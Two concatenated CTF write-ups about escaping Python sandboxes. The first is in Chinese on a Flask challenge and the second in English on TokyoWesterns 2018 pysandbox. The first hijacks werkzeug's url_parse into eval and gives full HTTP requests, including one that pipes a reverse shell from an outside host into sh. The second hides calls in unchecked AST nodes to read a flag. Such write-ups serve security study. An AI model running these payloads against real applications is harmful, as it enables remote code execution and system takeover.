#### 非预期  
通过app.static_folder 动态更改静态文件目录，将静态文件目录设为根目录，从而任意文件读,这也是pysandbox的大部分做法  
#### 预期  
预期就是pysandbox2 必须RCE

本题的主要思路就是劫持函数，通过替换某一个函数为eval system等，然后变量外部可控，即可RCE  
看了一下大家RCE的做法都不相同，但只要是劫持都算在预期内，只是链不一样，这里就只贴一下自己当时挖到的方法了

首先要找到一个合适的函数，满足参数可控，最终找到werkzeug.urls.url_parse这个函数，参数就是HTTP包的路径

比如  
```  
GET /index.php HTTP/1.1  
Host: xxxxxxxxxxxxx  
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101
Firefox/77.0  
```  
参数就是 '/index.php'  
然后是劫持，我们无法输入任何括号和空格，所以无法直接import werkzeug  
需要通过一个继承链关系来找到werkzeug这个类  
直接拿出tokyowestern 2018年
shrine的找继承链脚本（https://eviloh.github.io/2018/09/03/TokyoWesterns-2018-shrine-
writeup/)  
访问一下，即可在1.txt最下面看到继承链  
最终找到是  
`request.__class__._get_current_object.__globals__['__loader__'].__class__.__weakref__.__objclass__.contents.__globals__['__loader__'].exec_module.__globals__['_bootstrap_external']._bootstrap.sys.modules['werkzeug.urls']  
`  
但是发现我们不能输入任何引号，这个考点也考多了，可以通过request的属性进行bypass  
一些外部可控的request属性  
request.host  
request.content_md5  
request.content_encoding  
所以请求1  
```  
POST / HTTP/1.1  
Host: __loader__  
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101
Firefox/77.0  
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8  
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2  
Accept-Encoding: gzip, deflate  
Connection: close  
Cookie:
experimentation_subject_id=IjA3OWUxNDU0LTdiNmItNDhmZS05N2VmLWYyY2UyM2RmZDEyMyI%3D
--a3effd8812fc6133bcea4317b16268364ab67abb; lang=zh-CN  
Upgrade-Insecure-Requests: 1  
Cache-Control: max-age=0  
Content-MD5: _bootstrap_external  
Content-Encoding: werkzeug.urls  
Content-Type: application/x-www-form-urlencoded  
Content-Length: 246

cmd=request.__class__._get_current_object.__globals__[request.host].__class__.__weakref__.__objclass__.contents.__globals__[request.host].exec_module.__globals__[request.content_md5]._bootstrap.sys.modules[request.content_encoding].url_parse=eval  
```  
然后url_parse函数就变成了eval  
然后访问第二个请求

```  
POST __import__('os').system('curl${IFS}https://shell.now.sh/8.8.8.8:1003|sh')
HTTP/1.1  
Host: __loader__  
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101
Firefox/77.0  
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8  
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2  
Accept-Encoding: gzip, deflate  
Connection: close  
Cookie:
experimentation_subject_id=IjA3OWUxNDU0LTdiNmItNDhmZS05N2VmLWYyY2UyM2RmZDEyMyI%3D
--a3effd8812fc6133bcea4317b16268364ab67abb; lang=zh-CN  
Upgrade-Insecure-Requests: 1  
Cache-Control: max-age=0  
Content-MD5: _bootstrap_external  
Content-Encoding: werkzeug.urls  
Content-Type: application/x-www-form-urlencoded  
Content-Length: 246

cmd=request.__class__._get_current_object.__globals__[request.host].__class__.__weakref__.__objclass__.contents.__globals__[request.host].exec_module.__globals__[request.content_md5]._bootstrap.sys.modules[request.content_encoding].url_parse=eval  
```  
shell就弹回来了# Tokyo Western 2018: pysandbox

__Tags:__ `misc`  

This sandbox uses python's `ast` module to parse the input string to its
corresponding _abstract syntax tree_. This is what python uses to represent
scripts during runtime.

A quick reading of the server scripts shows that when check encounters a
`Call` or `Attribute` in the expression, it will be considered invalid.

```python  
# Allowed  
1 + 2  
[1, 2]

# Not Allowed  
len([1, 2])  
[1, 2].append(3)  
''.__class__  
```

The incorrect way to approach this problem is to look for ways to be able to
do this __without__ `Call`. Instead, we should look for areas in the tree
__not seen by `check`__.

The task was nice enough to put a comment that can be found from python's
`ast` [module documentation](https://docs.python.org/2/library/ast.html).

Comment  
```  
expr = BoolOp(boolop op, expr* values)  
       | BinOp(expr left, operator op, expr right)  
       | UnaryOp(unaryop op, expr operand)  
       | Lambda(arguments args, expr body)  
       | IfExp(expr test, expr body, expr orelse)  
```

Implemented Checks  
```python  
   attributes = {  
           'BoolOp': ['values'],  
           'BinOp': ['left', 'right'],  
           'UnaryOp': ['operand'],  
           'Lambda': ['body'],  
           'IfExp': ['test', 'body', 'orelse']  
		...  
```

These list down the different components of a particular expression, and the
`attributes` dictionary shows the parts that `check` traverses. We compare the
two and identify several parts that are not checked.

Here are some examples:

| Original                                             | Implemented Checks    | Unchecked parts |  
|------------------------------------------------------|-----------------------:|-----------------:|  
| Lambda(arguments args, expr body)                    | 'Lambda': ['body']    | args            |  
| ListComp(expr elt, comprehension* generators)        | 'ListComp': ['elt']   | generators      |  
| Subscript(expr value, slice slice, expr_context ctx) | Subscript': ['value'] | slice, ctx      |

.

Based on this we can infer that any `Call` in those parts will not be checked.

All of the unchecked parts can be used to hide calls. Here are two ways of
getting the flags based on the findings above:

### Using List Comprehensions

```  
[e for e in list(open('flag'))]  
```

### Using Subscript

```  
[][sys.stdout.write(open('flag').read())]  
```

### Note of Flag2

For the second flag, it is really the same thing, but the `attributes` inside
the `check` function is more complete.

```python  
       attributes = {  
           'BoolOp': ['values'],  
           'BinOp': ['left', 'right'],  
           'UnaryOp': ['operand'],  
           'Lambda': ['body'],  
           'IfExp': ['test', 'body', 'orelse'],  
           'Dict': ['keys', 'values'],  
           'Set': ['elts'],  
           'ListComp': ['elt', 'generators'],  
           'SetComp': ['elt', 'generators'],  
           'DictComp': ['key', 'value', 'generators'],  
           'GeneratorExp': ['elt', 'generators'],  
           'Yield': ['value'],  
           'Compare': ['left', 'comparators'],  
           'Call': False, # call is not permitted  
           'Repr': ['value'],  
           'Num': True,  
           'Str': True,  
           'Attribute': False, # attribute is also not permitted  
           'Subscript': ['value'],  
           'Name': True,  
           'List': ['elts'],  
           'Tuple': ['elts'],  
           'Expr': ['value'], # root node  
           'comprehension': ['target', 'iter', 'ifs'],  
       }

```  

Original writeup (https://github.com/pberba/ctf-
solutions/tree/master/20180901_tokyo_western/pysandbox).